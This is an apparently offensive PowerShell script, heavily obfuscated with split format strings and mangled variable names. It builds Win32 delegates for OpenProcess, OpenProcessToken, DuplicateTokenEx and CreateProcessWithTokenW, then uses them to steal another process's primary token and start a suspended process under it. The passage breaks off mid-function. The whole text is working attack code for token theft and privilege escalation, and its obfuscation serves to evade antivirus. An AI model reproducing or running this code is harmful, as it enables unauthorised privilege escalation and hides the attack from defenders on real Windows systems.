	    ${dY`NaS`SEmbLY} = &("{1}{0}{2}"-f'ew-Obje','N','ct') ("{5}{6}{0}{1}{4}{3}{2}" -f 'flection','.','blyName','sem','As','System.R','e')(("{4}{0}{1}{3}{2}" -f 'e','flectedDe','e','legat','R'))
	    ${A`SS`E`mbL`YBu`IldER} = ${Do`Ma`iN}.("{5}{3}{1}{4}{0}{6}{2}"-f'ynam','ine','sembly','f','D','De','icAs').Invoke(${DY`Nass`EmBly},   ${cy`UW}::"r`Un")
	    ${m`Od`ULEB`UiLDEr} = ${A`SSemBlyBU`I`ldER}.("{3}{4}{0}{2}{1}{5}"-f 'y','am','n','Defi','neD','icModule').Invoke(("{2}{1}{3}{0}" -f'ryModule','Me','In','mo'), ${F`Alse})
	    ${T`Y`pEbuIlDEr} = ${mODU`LEBuILd`er}.("{2}{3}{1}{0}" -f'pe','eTy','Defi','n').Invoke(("{3}{2}{1}{4}{0}"-f'e','egateT','yDel','M','yp'), ("{7}{2}{1}{4}{3}{6}{5}{9}{8}{0}" -f 'ss',' P','ss,','c, Seale','ubli','iClass, Au','d, Ans','Cla','oCla','t'), [System.MulticastDelegate])
	    ${C`onS`TR`UcTorBu`ildER} = ${typ`Eb`UI`ldER}.("{5}{2}{0}{4}{3}{1}"-f'st','r','efineCon','cto','ru','D').Invoke(("{2}{3}{0}{6}{5}{7}{8}{1}{4}" -f'cia',' P','RT','Spe','ublic','a','lN','me, HideB','ySig,'),   (  &("{0}{1}"-f 'GeT-iT','EM')  ('v'+'ARi'+'abL'+'E:hUvdb'))."v`ALue"::"sT`A`NdaRd", ${PaRAm`Ete`Rs})
	    ${C`oN`STRUc`TOrbu`IlDEr}.("{4}{3}{1}{0}{5}{2}"-f 'i','t','ags','etImplementa','S','onFl').Invoke(("{4}{1}{2}{3}{0}" -f 'd','u','ntime, M','anage','R'))
	    ${mETHo`d`B`Ui`LDEr} = ${tY`PeB`Uild`er}.("{2}{0}{1}" -f 'fi','neMethod','De').Invoke('Invoke', ("{1}{0}{3}{6}{7}{2}{5}{4}"-f'lic, H','Pub',' NewSlot, V','ideB','ual','irt','ySi','g,'), ${re`T`UR`NtYpe}, ${p`AraM`eTErS})
	    ${m`E`T`h`ODBUIlDEr}.("{4}{3}{0}{2}{1}" -f 'lemen','tionFlags','ta','mp','SetI').Invoke(("{3}{1}{2}{0}"-f ' Managed','t','ime,','Run'))
	    
	    &("{3}{0}{2}{1}" -f'rite-Ou','put','t','W') ${TYpe`BuIL`d`er}.("{2}{0}{1}"-f 'y','pe','CreateT').Invoke()
	}


	
	Function gEt`-pRocA`dDR`ess
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( PosITiON = 0, maNDAToRy = ${Tr`Ue} )]
	        [String]
	        ${mo`d`UlE},
	        
	        [Parameter( PosiTION = 1, MaNDatOrY = ${TR`Ue} )]
	        [String]
	        ${pRo`ceD`UrE}
	    )

	    
	    ${SysTE`M`ASsembly} =   ${b`92}::"C`U`RrENTd`OmaiN".("{1}{0}{2}"-f 'blie','GetAssem','s').Invoke() |
	        &("{1}{3}{2}{0}"-f'ject','Wher','-Ob','e') { ${_}."gLobA`L`A`ssEmB`lycac`HE" -And ${_}."l`o`CatioN".("{0}{1}" -f 'S','plit').Invoke('\\')[-1].("{0}{1}" -f 'Equ','als').Invoke(("{2}{0}{1}" -f 'tem.','dll','Sys')) }
	    ${UnsaFeN`AtIVEm`ETH`O`ds} = ${sYsteM`A`Ss`eMBlY}.("{1}{2}{0}"-f'pe','G','etTy').Invoke(("{7}{9}{2}{5}{6}{1}{4}{0}{3}{8}"-f 'v','eNat','.U','eMethod','i','nsa','f','Microsoft.','s','Win32'))
	    
	    ${G`EtM`OdU`LehAndle} = ${u`NsAfENaTIvE`meTh`OdS}.("{1}{2}{0}"-f 'Method','G','et').Invoke(("{3}{2}{0}{1}" -f 'l','e','etModuleHand','G'))
	    ${GE`T`P`R`ocadDrEss} = ${U`Ns`Af`eNAtiVEM`EtHO`Ds}.("{1}{0}{2}"-f'th','GetMe','od').Invoke(("{0}{2}{3}{1}"-f'G','ss','et','ProcAddre'))
	    
	    ${K`Er`N32`h`ANDle} = ${GeTmo`dU`Le`H`AndlE}."InV`okE"(${n`ULL}, @(${M`ODu`LE}))
	    ${t`Mp`pTR} = &("{2}{0}{1}" -f'w-Obje','ct','Ne') ("{1}{2}{0}"-f 'r','I','ntPt')
	    ${haNDLe`R`Ef} = &("{1}{0}{2}"-f 'Ob','New-','ject') ("{2}{0}{3}{1}{4}{5}{6}"-f'ste','opSe','Sy','m.Runtime.Inter','rvices.Handl','eR','ef')(${tmPp`Tr}, ${kerN3`2ha`NDlE})

	    
	    &("{0}{2}{1}{3}" -f 'Wri','e-Outpu','t','t') ${gETproc`AD`dR`e`ss}."iNV`oKE"(${Nu`Ll}, @([System.Runtime.InteropServices.HandleRef]${haN`D`lErEf}, ${P`RoC`edUre}))
	}

    
    
    
    ${co`Ns`TaNtS} = @{
        ("{3}{1}{4}{0}{2}"-f 'M_SECUR','CC','ITY','A','ESS_SYSTE') = 0x01000000
        ("{2}{0}{1}"-f'D','_CONTROL','REA') = 0x00020000
        ("{2}{1}{0}{3}"-f'NCHRONI','Y','S','ZE') = 0x00100000
        ("{1}{0}{3}{2}{4}" -f 'NDA','STA','D_RIG','R','HTS_ALL') = 0x001F0000
        ("{0}{2}{1}"-f'TO','RY','KEN_QUE') = 8
        ("{5}{4}{1}{2}{0}{3}" -f'IVIL','JU','ST_PR','EGES','KEN_AD','TO') = 0x20
        ("{0}{3}{2}{1}" -f'ERROR_','EN','TOK','NO_') = 0x3f0
        ("{1}{0}{3}{2}{4}"-f'C','SE','RIT','U','Y_DELEGATION') = 3
        ("{0}{6}{5}{4}{3}{1}{2}"-f'D','Y_INF','ORMATION','CURIT','_SE','L','AC') = 0x4
        ("{0}{3}{1}{2}"-f 'ACCESS_ALLOWED_A','_T','YPE','CE') = 0x0
        ("{4}{2}{0}{1}{3}" -f 'IGH','TS_','DARD_R','REQUIRED','STAN') = 0x000F0000
        ("{0}{1}{5}{2}{4}{3}" -f'DES','KTOP','NERIC','LL','_A','_GE') = 0x000F01FF
        ("{2}{1}{0}"-f'ITE_DAC','R','W') = 0x00040000
        ("{1}{0}{2}{3}"-f 'T_INHER','OBJEC','IT_AC','E') = 0x1
        ("{1}{3}{2}{0}"-f'CCESS','GRA','A','NT_') = 0x1
        ("{3}{1}{0}{2}" -f'S','_I','_NAME','TRUSTEE') = 0x1
        ("{2}{1}{0}{3}{4}"-f 'STEE','U','TR','_IS_S','ID') = 0x0
        ("{1}{2}{0}" -f'ER','TRUSTEE_IS_U','S') = 0x1
        ("{6}{2}{1}{0}{3}{4}{5}" -f'O','N','IS_WELL_K','W','N_GROU','P','TRUSTEE_') = 0x5
        ("{2}{4}{1}{3}{0}"-f'GROUP','EE','TRUS','_IS_','T') = 0x2
        ("{6}{1}{2}{0}{4}{3}{5}"-f 'RY','ROCESS_QU','E','TI','_INFORMA','ON','P') = 0x400
        ("{3}{2}{0}{1}"-f'GN_PR','IMARY','SI','TOKEN_AS') = 0x1
        ("{3}{0}{1}{2}" -f'I','C','ATE','TOKEN_DUPL') = 0x2
        ("{1}{2}{4}{3}{0}"-f 'ATE','TOKEN_IMP','ER','ON','S') = 0x4
        ("{3}{0}{2}{1}{4}"-f '_QU','C','ERY_SOUR','TOKEN','E') = 0x10
        ("{3}{1}{2}{0}{4}" -f 'IGHTS_','NDARD','_R','STA','READ') = 0x20000
        ("{2}{1}{3}{0}" -f'cs','i','TokenStat','sti') = 10
        ("{2}{3}{1}{0}{4}" -f'ALL_AC','N_','TOK','E','CESS') = 0xf01ff
        ("{0}{2}{1}{3}" -f 'MAXIMUM','E','_ALLOW','D') = 0x02000000
        ("{1}{3}{0}{4}{2}" -f '_','THRE','CCESS','AD','ALL_A') = 0x1f03ff
        ("{3}{0}{2}{4}{1}" -f'ROR_INVA','TER','LID_PARA','ER','ME') = 0x57
        ("{5}{2}{0}{3}{1}{6}{4}"-f'_NETCRE','TI','N','DEN','_ONLY','LOGO','ALS') = 0x2
        ("{4}{6}{1}{3}{2}{0}{5}"-f 'E','LE','E_','G','SE_PR','NABLED','IVI') = 0x2
        ("{0}{1}{2}{3}{7}{4}{8}{6}{5}" -f 'SE_','PRIVIL','EGE_ENA','BL','Y_D','LT','U','ED_B','EFA') = 0x1
        ("{4}{3}{2}{1}{0}"-f'MOVED','E','E_R','PRIVILEG','SE_') = 0x4
        ("{1}{2}{0}"-f 'ENDED','CREATE_SUS','P') = 0x4
    }

    ${wIn`32con`sTANts} = &("{2}{3}{1}{0}" -f'ct','je','Ne','w-Ob') ("{2}{1}{0}" -f'bject','O','PS') -Property ${cONST`A`NTS}
    


    
    
    
	
	
	${DoMa`IN} =  (&("{2}{0}{1}"-f'aRIA','BLe','v')  ('B9'+'2'))."v`ALuE"::"C`U`R`RE`NtDoMAiN"
	${D`Ynam`i`CassEm`BLy} = &("{2}{3}{1}{0}"-f 't','Objec','N','ew-') ("{8}{1}{5}{4}{7}{6}{0}{2}{3}" -f 'n.','tem','AssemblyNam','e','flect','.Re','o','i','Sys')(("{0}{2}{1}{3}" -f 'D','n','y','amicAssembly'))
	${aSSEmbL`yBuI`L`d`er} = ${DOm`A`In}.("{4}{0}{2}{3}{1}{5}"-f 'fineDy','m','nam','icAsse','De','bly').Invoke(${dyn`Am`icAss`E`mbLy},  (&('LS') ("vA"+"rI"+"AB"+"LE:cYuw"))."V`AlUe"::"r`Un")
	${m`oD`U`lEb`UILdeR} = ${asseM`BL`yB`UilDeR}.("{1}{0}{3}{4}{2}{5}" -f 'in','Def','cModu','eDy','nami','le').Invoke(("{0}{1}{2}{4}{3}" -f 'D','y','n','icModule','am'), ${f`AlSE})
	${cONs`T`RuctORin`FO} =  ${K`IdbR}.("{3}{0}{4}{1}{2}"-f'o','cto','rs','GetC','nstru').Invoke()[0]

    
    ${A`TTR`IB`Utes} = ("{11}{5}{0}{1}{12}{4}{8}{2}{3}{10}{9}{6}{7}"-f'ut, AnsiCl','ass, ',', Sequ','en','ubl','toLayo','ut, Seale','d, BeforeFieldInit','ic','ayo','tialL','Au','Class, P')
	${T`Y`pEbUiLdEr} = ${mo`d`Ul`ebuIldeR}.("{0}{1}{3}{2}"-f'Defin','eT','pe','y').Invoke(("{0}{3}{2}{1}"-f'STAR','FO','UPIN','T'), ${a`T`TR`iButES}, [System.ValueType])
	${tyPeb`UILD`eR}."DEFiNeF`iE`lD"('cb', [UInt32], ("{0}{1}" -f 'Pu','blic')) | &("{2}{0}{1}" -f 'l','l','Out-Nu')
	${ty`pEb`UILdER}.("{3}{1}{0}{2}" -f 'el','eFi','d','Defin').Invoke(("{2}{1}{3}{0}" -f 'ed','e','lpRes','rv'), [IntPtr], ("{1}{0}"-f'lic','Pub')) | &("{2}{0}{1}"-f 'Nu','ll','Out-')
    ${tY`pEBuilD`ER}.("{2}{3}{0}{1}"-f 'n','eField','D','efi').Invoke(("{0}{1}" -f'lpD','esktop'), [IntPtr], ("{0}{1}" -f'Publ','ic')) | &("{0}{1}"-f 'O','ut-Null')
    ${t`YPEBu`I`lDeR}.("{2}{0}{1}"-f 'efineF','ield','D').Invoke(("{0}{1}"-f 'lp','Title'), [IntPtr], ("{1}{0}" -f 'ic','Publ')) | &("{2}{1}{0}" -f 't-Null','u','O')
    ${tY`PE`BUILd`Er}."deF`InefIe`lD"('dwX', [UInt32], ("{1}{0}"-f'blic','Pu')) | &("{1}{2}{0}" -f 'ull','Out-','N')
    ${TY`Pe`B`UildEr}."dEFiN`e`FIElD"('dwY', [UInt32], ("{2}{1}{0}"-f 'c','li','Pub')) | &("{1}{2}{0}" -f 'Null','O','ut-')
    ${Ty`peBUi`lD`eR}.("{1}{3}{0}{2}"-f'el','De','d','fineFi').Invoke(("{2}{0}{1}"-f'wXS','ize','d'), [UInt32], ("{0}{1}"-f 'Publ','ic')) | &("{0}{1}{2}" -f 'Out-N','u','ll')
    ${tyPe`B`U`iLdeR}.("{0}{2}{1}"-f'Defin','ield','eF').Invoke(("{0}{2}{1}" -f 'dwYSi','e','z'), [UInt32], ("{0}{1}" -f 'Pub','lic')) | &("{1}{2}{0}"-f 'Null','O','ut-')
    ${tYp`EB`UIl`dER}.("{2}{0}{1}"-f'i','eld','DefineF').Invoke(("{0}{2}{1}" -f'dwXC','Chars','ount'), [UInt32], ("{0}{1}"-f'Publ','ic')) | &("{2}{1}{0}"-f'l','l','Out-Nu')
    ${T`yPeBU`i`LDER}.("{1}{2}{0}"-f 'eld','Defin','eFi').Invoke(("{2}{0}{1}" -f 'u','ntChars','dwYCo'), [UInt32], ("{2}{1}{0}" -f 'ic','l','Pub')) | &("{0}{1}{2}" -f'Out','-Nu','ll')
    ${tYpebu`Ild`er}.("{0}{2}{3}{1}"-f 'Defin','ld','eFi','e').Invoke(("{0}{1}{2}{3}" -f'dw','FillAt','tr','ibute'), [UInt32], ("{0}{1}" -f 'Publ','ic')) | &("{0}{1}"-f 'Ou','t-Null')
    ${t`YpEB`UIlDer}.("{1}{2}{3}{0}"-f 'd','Def','ineFi','el').Invoke(("{0}{2}{1}" -f'dwF','gs','la'), [UInt32], ("{2}{0}{1}" -f'l','ic','Pub')) | &("{0}{1}" -f 'Out-','Null')
    ${t`yPEB`U`ILDER}.("{3}{0}{2}{1}" -f'n','Field','e','Defi').Invoke(("{2}{1}{3}{0}" -f 'w','h','wS','owWindo'), [UInt16], ("{2}{1}{0}" -f'c','ubli','P')) | &("{0}{1}"-f'Out','-Null')
    ${tyP`EBU`iL`Der}.("{0}{1}{2}"-f'Def','ineFi','eld').Invoke(("{1}{2}{0}"-f'rved2','cbR','ese'), [UInt16], ("{2}{0}{1}" -f 'b','lic','Pu')) | &("{1}{0}{2}"-f 'l','Out-Nu','l')
    ${TYpeB`U`ilDEr}.("{0}{3}{2}{1}" -f'D','ld','ie','efineF').Invoke(("{1}{3}{0}{2}" -f 'es','l','erved2','pR'), [IntPtr], ("{1}{0}" -f 'lic','Pub')) | &("{0}{1}{2}" -f 'O','ut-Nul','l')
    ${Ty`PE`Bu`ILdeR}.("{1}{2}{3}{0}"-f 'eld','D','efineF','i').Invoke(("{0}{1}"-f 'hStdI','nput'), [IntPtr], ("{1}{0}{2}"-f'u','P','blic')) | &("{1}{0}{2}"-f'l','Out-Nu','l')
    ${tYPEbu`iL`DeR}.("{0}{1}{2}" -f'Defin','eFi','eld').Invoke(("{3}{2}{0}{1}" -f 'u','t','StdOutp','h'), [IntPtr], ("{1}{0}{2}"-f 'bli','Pu','c')) | &("{1}{0}"-f'Null','Out-')
    ${tYPe`BUI`L`dER}.("{2}{0}{1}" -f'fineFie','ld','De').Invoke(("{1}{0}{2}"-f'tdE','hS','rror'), [IntPtr], ("{1}{2}{0}"-f 'c','Pub','li')) | &("{0}{1}{2}" -f 'Out-','N','ull')
	${S`TARtU`piNfO} = ${TyPeb`UILd`Er}.("{0}{1}{2}" -f 'Crea','t','eType').Invoke()

    
    ${aTtrI`B`UT`eS} = ("{13}{12}{0}{9}{1}{2}{4}{11}{3}{8}{6}{16}{5}{14}{10}{7}{15}" -f'nsiCla','ss, Public,',' ','ntialLayo','Se',' Befo',' Sea','eldIn','ut,','ss, Cla','i','que','ayout, A','AutoL','reF','it','led,')
	${TY`P`eBuild`Er} = ${MOdUL`E`BU`ildeR}.("{0}{3}{1}{2}"-f'Def','n','eType','i').Invoke(("{2}{3}{1}{0}"-f 'ON','FORMATI','PROCESS_I','N'), ${a`TT`RI`ButeS}, [System.ValueType])
	${type`BuI`L`dER}.("{0}{1}{3}{2}" -f'Defin','e','d','Fiel').Invoke(("{1}{0}{2}" -f's','hProce','s'), [IntPtr], ("{1}{0}" -f 'c','Publi')) | &("{2}{1}{0}" -f 'ull','ut-N','O')
	${ty`PEB`UiLD`ER}.("{1}{2}{0}" -f'eld','Define','Fi').Invoke(("{1}{0}{2}"-f 'a','hThre','d'), [IntPtr], ("{1}{0}"-f 'blic','Pu')) | &("{0}{2}{1}"-f'Out-','ull','N')
    ${ty`P`E`BUILDeR}.("{2}{0}{1}" -f'neFiel','d','Defi').Invoke(("{1}{3}{0}{2}" -f 'roces','dw','sId','P'), [UInt32], ("{0}{1}"-f'Publi','c')) | &("{2}{0}{1}" -f'ut-N','ull','O')
    ${tYP`eB`UilD`Er}.("{1}{2}{0}"-f 'ld','De','fineFie').Invoke(("{0}{3}{1}{2}"-f'd','hread','Id','wT'), [UInt32], ("{0}{1}{2}"-f'P','u','blic')) | &("{2}{1}{0}"-f'l','Nul','Out-')
	${prOc`E`ss`_iNFO`Rma`TiON} = ${tyPe`BUIl`DER}.("{1}{2}{0}" -f'e','CreateTy','p').Invoke()
    


    
    
    
    ${Op`EN`pr`oC`EsSADDR} = &("{0}{2}{1}" -f 'Get-ProcAd','s','dres') ("{0}{2}{1}"-f'k','2.dll','ernel3') ("{2}{1}{0}" -f'ocess','Pr','Open')
	${oPe`N`P`R`OC`esSdeLEGATE} = &("{1}{3}{2}{0}"-f'e','G','gateTyp','et-Dele') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	${OPENpR`Oc`EsS} =  ${zf`I2Wh}::("{3}{6}{1}{2}{0}{4}{5}" -f 'egateForF','tD','el','G','uncti','onPointer','e').Invoke(${opENpRO`Ce`ss`ADDR}, ${O`PenpRoceSSD`eleg`A`Te})

    ${o`PeNPR`o`C`esSTOKeN`AdDR} = &("{3}{1}{0}{2}{4}"-f 'ProcA','-','d','Get','dress') ("{0}{3}{2}{1}"-f 'adv','.dll','32','api') ("{3}{1}{2}{0}"-f'oken','ocess','T','OpenPr')
	${OpEnpRo`ceS`st`oK`ENDe`legATe} = &("{1}{4}{2}{3}{0}"-f 'e','Get-','egate','Typ','Del') @([IntPtr], [UInt32],   (&("{0}{1}"-f 'd','ir') ('VArI'+'abl'+'e:'+'BQta')  )."VA`lue".("{0}{2}{1}" -f 'M','ype','akeByRefT').Invoke()) ([Bool])
	${o`PenP`R`ocEsST`oK`eN} =   ( &("{2}{1}{3}{0}" -f'riaBlE','E','g','t-va')  ("{0}{1}"-f 'ZFi','2wh') )."V`AluE"::("{2}{6}{5}{4}{0}{1}{8}{3}{7}" -f 'e','F','Ge','nt','at','Deleg','t','er','orFunctionPoi').Invoke(${OpEnp`RoCesSTO`Ken`A`DDr}, ${O`peNP`R`Oce`SsTO`keN`DELeGate})    

    ${CReATep`RO`Cess`withTOKENwAd`Dr} = &("{3}{0}{2}{1}"-f 'A','ess','ddr','Get-Proc') ("{1}{3}{2}{0}" -f 'dll','a','2.','dvapi3') ("{2}{6}{3}{4}{5}{1}{0}"-f 'W','n','C','e','ateProcess','WithToke','r')
	${Cre`A`TeprO`cES`Sw`ITh`TokeN`W`DElEgAtE} = &("{0}{2}{3}{4}{1}"-f'G','legateType','e','t','-De') @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	${CreaTE`p`R`o`c`es`sWiThTokeNw} =  ( &("{1}{0}"-f'i','Gc')  ("{3}{2}{0}{1}{4}"-f'IAble:','z','R','vA','fi2wH') )."vAL`UE"::("{5}{0}{4}{3}{1}{2}" -f'Del','onPoi','nter','uncti','egateForF','Get').Invoke(${CREa`TEProcE`ss`W`IthTOK`ENWa`dDR}, ${crEat`e`pRoc`EsS`W`iT`HTO`kENw`DEleGatE})

    ${M`EM`seta`DDR} = &("{2}{0}{1}{4}{3}"-f'-Pr','ocAdd','Get','s','res') ("{0}{2}{1}"-f 'msvcr','dll','t.') ("{1}{0}"-f 'mset','me')
	${mem`SE`TdElEg`ATE} = &("{4}{2}{1}{0}{3}" -f 'y','teT','a','pe','Get-Deleg') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	${meM`s`Et} =  (&("{0}{1}" -f 'G','Ci') ('var'+'i'+'AblE:'+'ZFi2Wh'))."VA`lUE"::("{6}{7}{1}{0}{4}{5}{3}{2}" -f'Fu','eFor','nter','i','ncti','onPo','Ge','tDelegat').Invoke(${M`eMSet`AdDr}, ${M`e`MsetDEle`GATe})

    ${d`Up`lIc`ATe`ToKE`N`eXaDdR} = &("{0}{2}{1}"-f'Get-Pro','Address','c') ("{0}{1}{2}"-f'adv','api','32.dll') ("{2}{1}{0}{3}" -f'teTokenE','ca','Dupli','x')
	${D`UPL`ICAtetOK`EnexdE`LE`g`Ate} = &("{2}{0}{3}{4}{1}"-f 'e','ype','Get-Del','gat','eT') @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32],  ${B`QtA}.("{1}{0}{2}"-f'keB','Ma','yRefType').Invoke()) ([Bool])
	${dU`pL`I`CaTetOkeneX} =  ${zF`I`2wH}::("{0}{5}{2}{4}{1}{3}"-f 'GetDe','Po','t','inter','ion','legateForFunc').Invoke(${d`Upl`ICaTeTOkeN`ex`Ad`Dr}, ${DUPlI`Ca`T`e`TokeN`e`Xd`ElEgaTe})

    ${C`loSeH`And`L`eADdr} = &("{1}{0}{3}{2}"-f'ProcAddre','Get-','s','s') ("{2}{0}{1}{3}" -f '2','.','kernel3','dll') ("{0}{1}{3}{2}"-f'Clos','e','le','Hand')
	${C`LoSehaND`lE`D`EleG`ATE} = &("{1}{0}{2}{3}"-f 'legat','Get-De','eTyp','e') @([IntPtr]) ([Bool])
	${cLos`EhAND`Le} =  ${Z`Fi`2Wh}::("{3}{4}{5}{2}{1}{0}" -f 'r','ctionPointe','orFun','GetDele','ga','teF').Invoke(${CLOSeH`AN`DlEA`ddr}, ${CL`OsEHAN`DLE`DELegatE})

    ${LS`Af`REeREtU`R`NB`UfFErAD`dr} = &("{0}{3}{1}{2}" -f'Get-Pr','cAdd','ress','o') ("{2}{0}{1}{3}"-f'd','l','secur32.','l') ("{1}{3}{0}{2}{4}" -f 'nBuf','Lsa','f','FreeRetur','er')
	${L`sA`FrEer`et`Ur`NbuF`FEr`del`Egate} = &("{3}{4}{2}{1}{0}" -f'Type','te','a','Get-Dele','g') @([IntPtr]) ([UInt32])
	${L`S`A`FreER`eTuRnBUf`FER} =  ${ZfI2`Wh}::("{0}{1}{4}{2}{3}{6}{5}"-f 'GetDel','ega','ForFunc','tionP','te','nter','oi').Invoke(${L`S`A`FReEretU`RnBUFFeR`A`ddr}, ${LsaFRe`ERET`Ur`N`BUFfeR`de`LegaTE})

    ${GEtPr`O`CEsS`I`DAddR} = &("{1}{3}{2}{0}" -f'ocAddress','Get','Pr','-') ("{2}{0}{3}{1}" -f 'rn','ll','Ke','el32.d') ("{0}{2}{1}{3}" -f'GetPr','ce','o','ssId')
	${G`ET`Pr`oCEsS`iddeLegate} = &("{3}{1}{0}{2}"-f'eTy','legat','pe','Get-De') @([IntPtr]) ([UInt32])
	${gETp`RO`c`eSsid} =  (&("{1}{0}"-f'R','di')  ("VA"+"RiaB"+"Le:z"+"FI"+"2Wh"))."v`AlUe"::("{1}{0}{3}{2}{6}{4}{5}"-f 'l','GetDe','ateFor','eg','Poin','ter','Function').Invoke(${G`ETP`R`oc`eSSida`dDr}, ${getPR`Oc`Es`s`iDdElegatE})
    


    
    
    function ge`T-PrImar`YT`o`kEn
    {
        Param(
            [Parameter(pOSItiOn=0, maNDaTorY=${T`RUE})]
            [UInt32]
            ${p`R`O`ceSSid},

            
            [Parameter()]
            [Switch]
            ${f`U`lLP`RIVS}
        )

        if (${FULl`p`RiVS})
        {
            ${TOke`NPR`i`VS} = ${WiN`3`2cONstaN`Ts}."TOKeN_a`lL_ACce`SS"
        }
        else
        {
            ${T`okE`NPRIVs} = ${WI`N3`2COnst`AntS}."T`OKEN_ASs`I`g`N_Pr`imARY" -bor ${WI`N32CO`N`STA`NTs}."T`o`KEn_DUp`LIc`ATe" -bor ${wIn`32cOn`S`TaNtS}."Tok`EN_iMPErso`N`ATE" -bor ${wIn32cO`Ns`TaNtS}."TOK`EN_Qu`erY" 
        }

        ${RetU`R`NSTR`Uct} = &("{0}{3}{2}{1}"-f 'New-Obj','t','c','e') ("{1}{2}{0}" -f 'ect','PS','Obj')

        ${hpR`O`ceSs} = ${OPeNPRO`cE`sS}."I`Nvoke"(${WI`N32C`ON`StantS}."PRocESS`_`q`UeRY_inform`At`Ion", ${t`Rue}, [UInt32]${P`R`OCEssID})
        ${Re`TurNs`T`RuCT} | &("{0}{2}{1}{3}" -f'Add','M','-','ember') -MemberType ("{2}{1}{0}" -f'eProperty','t','No') -Name ("{0}{1}{2}"-f 'hP','ro','cess') -Value ${hPROC`Ess}
        if (${hP`R`OCEsS} -eq  (&("{2}{0}{1}"-f'ari','ABLE','V')  ('BqT'+'a')  -VAlUE  )::"Z`Ero")
        {
            
            ${E`RroRC`ODe} =   (  &("{1}{0}" -f 'bLe','vaRia')  ("{1}{0}"-f 'h','ZFi2W')  -VAlUeO )::("{2}{1}{3}{0}" -f 'n32Error','etLas','G','tWi').Invoke()
            &("{3}{1}{0}{2}"-f'bo','e-Ver','se','Writ') "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process. "
            return ${NU`LL}
        }
        else
        {
            [IntPtr]${H`PrOCt`o`KEn} =   (&("{1}{2}{0}"-f '-VARIAbLe','g','Et')  ('B'+'QTA') )."Val`Ue"::"zE`Ro"
            ${SU`Cce`sS} = ${o`PEn`pRocESSTo`kEN}."i`NVOkE"(${h`P`ROc`ess}, ${T`Ok`E`NPRIvs}, [Ref]${h`p`RoctokeN})

            
            if (-not ${c`LosE`HAnD`LE}."I`N`VOke"(${hPRoc`e`sS}))
            {
                ${eR`ROrCo`dE} =   ${zF`I2`wH}::("{0}{2}{3}{1}"-f 'Ge','r','tLas','tWin32Erro').Invoke()
                &("{1}{2}{0}"-f 'ng','Write-War','ni') ('Fa'+'i'+'led '+'to'+' '+'clos'+'e '+'p'+'ro'+'cess '+'handl'+'e,'+' '+'th'+'is '+'i'+'s '+'un'+'e'+'xpected'+'. '+'ErrorCo'+'de'+': '+"$ErrorCode")
            }
            ${hpROc`EsS} =  ${b`qTa}::"z`ERo"

            if (${s`Ucc`ESs} -eq ${F`A`lse} -or ${H`proc`To`keN} -eq   ( &("{2}{0}{1}{3}"-f'T','-VARIaBL','gE','e')  ("{0}{1}" -f'bQ','tA')  )."vAL`Ue"::"Z`eRo")
            {
                ${e`Rr`Or`coDE} =  ( &("{1}{0}"-f'bLe','vARia') ("{1}{0}" -f 'H','ZFI2w')  )."val`UE"::("{1}{4}{0}{2}{3}" -f'LastWin32Er','Ge','ro','r','t').Invoke()
                &("{3}{1}{0}{2}"-f 'rn','-Wa','ing','Write') "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode "
                return ${n`UlL}
            }
            else
            {
                ${ret`Urn`s`TRUct} | &("{1}{0}{2}" -f 'dd-Me','A','mber') -MemberType ("{1}{2}{3}{0}" -f'ty','Note','Pr','oper') -Name ("{2}{1}{0}"-f 'n','rocToke','hP') -Value ${H`PRoCt`o`ken}
            }
        }

        return ${R`Et`UrNSTR`UcT}
    }


    
    
    function c`Re`At`E-sUSPE`NDEDWinlog`On
    {
        Param(
            [Parameter(PositiON=0, mANDATorY=${t`Rue})]
            [IntPtr]
            ${HT`O`KEn} 
        )

        ${p`RoCes`SID} = -1

        
        [IntPtr]${N`eWhT`OK`EN} =   ( &("{1}{0}{2}" -f 't','Ge','-iTEM') ("varIaB"+"Le:Bq"+"T"+"A")  )."V`ALue"::"Z`eRo"
        ${Su`c`cEsS} = ${DUpLiCa`T`E`T`OK`enex}."i`NVOke"(${HtO`ken}, ${w`IN`32CoN`STAn`Ts}."mAXIMuM_`A`l`LOw`eD",  ${b`qTA}::"zE`RO", 3, 1, [Ref]${N`eWHTOk`eN})
        if (-not ${Su`Cce`sS})
        {
            ${E`R`ROrc`odE} =   (&('GI')  ("{3}{2}{0}{1}"-f 'Fi','2wh','lE:z','VaRIAB')  )."V`ALUE"::("{1}{3}{4}{2}{0}" -f'32Error','G','stWin','etL','a').Invoke()
            &("{0}{1}{2}"-f'Write-Wa','rnin','g') ('Du'+'pl'+'i'+'cateToken'+'Ex '+'fa'+'i'+'led. '+'Err'+'or'+'Code:'+' '+"$ErrorCode")
        }
        else
        {
            ${S`TaR`TU`pI`NFOSIze} =  ${Z`FI`2wH}::"siz`eOf"([Type]${s`TaR`TUP`InfO})
            [IntPtr]${sTartU`pi`N`FoPTR} =   (&("{1}{0}"-f 'ci','G')  ("{4}{1}{2}{0}{3}"-f 'w','AB','Le:zFi2','h','vaRi') )."va`lUE"::("{3}{1}{0}{2}"-f'HG','loc','lobal','Al').Invoke(${stA`Rt`Up`iNF`OsizE})
            ${Me`Ms`ET}."i`NVOke"(${StaRt`UP`infop`TR}, 0, ${StARtuP`i`NfoSize}) | &("{1}{0}{2}"-f 'u','Out-N','ll')
             (  &("{0}{1}{2}"-f 'v','arI','aBle')  ("z"+"fI2Wh"))."va`lUe"::("{1}{2}{0}" -f 'teInt32','W','ri').Invoke(${Start`UpIn`Fop`Tr}, ${st`Art`U`piNfO`Size}) 

            ${prO`CeSs`in`FoSI`ze} =  ${zf`i2wh}::"S`IZE`OF"([Type]${PrOC`eSs`_Info`RMA`TION})
            [IntPtr]${P`R`ocesSI`NfO`PTR} =   (&("{2}{0}{1}{3}"-f'VArI','A','Get-','Ble')  ("ZfI2w"+"h")  -vaLu)::("{2}{1}{0}" -f 'bal','ocHGlo','All').Invoke(${p`RO`Cessin`FoSizE})

